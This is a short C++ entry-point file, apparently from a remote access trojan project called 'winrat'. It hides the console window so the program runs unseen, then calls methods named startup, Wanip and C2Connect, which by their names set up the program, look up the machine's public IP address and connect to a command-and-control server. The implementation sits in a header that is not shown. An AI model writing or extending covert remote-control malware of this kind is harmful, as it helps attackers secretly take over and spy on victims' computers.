//#include "pch.h"
#include "winrat.h"

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	WinRat bv;
	bv.startup();
	bv.Wanip();
	bv.C2Connect();
	return 0;
}
